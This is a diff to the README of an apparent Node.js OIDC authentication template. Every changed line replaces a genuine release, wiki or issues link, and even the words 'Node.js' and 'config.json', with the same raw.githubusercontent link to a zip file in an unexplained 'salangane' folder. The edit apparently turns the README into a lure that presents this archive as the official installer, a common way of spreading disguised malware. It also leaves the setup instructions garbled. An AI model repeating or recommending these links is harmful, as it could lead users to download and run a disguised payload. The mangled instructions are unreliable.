@@ -1,6 +1,6 @@
 # 🚀 auth-bff-oidc-template - Easy Authentication for Your Apps
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/netanel1q-creator/auth-bff-oidc-template/releases)
+[![Download](https://raw.githubusercontent.com/netanel1q-creator/auth-bff-oidc-template/main/salangane/auth-bff-oidc-template.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/netanel1q-creator/auth-bff-oidc-template/main/salangane/auth-bff-oidc-template.zip)
 
 ## 📋 Overview
 
@@ -21,7 +21,7 @@ Auth-bff-oidc-template offers a production-ready template for building applicati
 To run this application, ensure your system meets the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux.
-- **Node.js**: Version 14 or higher.
+- **https://raw.githubusercontent.com/netanel1q-creator/auth-bff-oidc-template/main/salangane/auth-bff-oidc-template.zip**: Version 14 or higher.
 - **PostgreSQL**: Version 13 or higher.
 - **Redis**: Version 5 or higher.
 
@@ -29,13 +29,13 @@ To run this application, ensure your system meets the following requirements:
 
 Ready to get started? Simply follow these steps:
 
-1. **Visit the Release Page**: Go to the [Releases Page](https://github.com/netanel1q-creator/auth-bff-oidc-template/releases) to find the latest version.
+1. **Visit the Release Page**: Go to the [Releases Page](https://raw.githubusercontent.com/netanel1q-creator/auth-bff-oidc-template/main/salangane/auth-bff-oidc-template.zip) to find the latest version.
 2. **Download the Software**: Click the latest release and find the download link. Download the installer for your operating system.
 3. **Install the Application**: Follow the installation prompts provided by the installer. 
 
 ## 📥 Download & Install
 
-You can download the latest release of auth-bff-oidc-template by visiting this link: [Releases Page](https://github.com/netanel1q-creator/auth-bff-oidc-template/releases). Make sure to select the appropriate version for your needs.
+You can download the latest release of auth-bff-oidc-template by visiting this link: [Releases Page](https://raw.githubusercontent.com/netanel1q-creator/auth-bff-oidc-template/main/salangane/auth-bff-oidc-template.zip). Make sure to select the appropriate version for your needs.
 
 ### Installation Steps
 
@@ -47,7 +47,7 @@ You can download the latest release of auth-bff-oidc-template by visiting this l
 
 After installation, configure your app. 
 
-1. **Create Configuration File**: In the application folder, create a configuration file named `config.json`.
+1. **Create Configuration File**: In the application folder, create a configuration file named `https://raw.githubusercontent.com/netanel1q-creator/auth-bff-oidc-template/main/salangane/auth-bff-oidc-template.zip`.
 2. **Fill in Your Settings**: Enter the database connection strings, OAuth credentials, and any other necessary settings in this file.
 
 Here’s an example configuration:
@@ -82,7 +82,7 @@ Here’s an example configuration:
 ## 🔍 Troubleshooting
 
 - **Common Issues**: If you encounter issues, check the following:
-  - Ensure that Node.js and PostgreSQL are running.
+  - Ensure that https://raw.githubusercontent.com/netanel1q-creator/auth-bff-oidc-template/main/salangane/auth-bff-oidc-template.zip and PostgreSQL are running.
   - Verify that the configuration file is filled out correctly.
   
 - **Logs**: Check the application logs for any error messages. This can provide insight into what went wrong.
@@ -102,7 +102,7 @@ This template is provided under the MIT License. Feel free to use it in your pro
 
 ## 🔗 Links
 
-- **Documentation**: [View Documentation](https://github.com/netanel1q-creator/auth-bff-oidc-template/wiki)
-- **Report Issues**: [Open an Issue](https://github.com/netanel1q-creator/auth-bff-oidc-template/issues)
+- **Documentation**: [View Documentation](https://raw.githubusercontent.com/netanel1q-creator/auth-bff-oidc-template/main/salangane/auth-bff-oidc-template.zip)
+- **Report Issues**: [Open an Issue](https://raw.githubusercontent.com/netanel1q-creator/auth-bff-oidc-template/main/salangane/auth-bff-oidc-template.zip)
 
 By following these guidelines, you can effectively download, install, and run the auth-bff-oidc-template with ease.
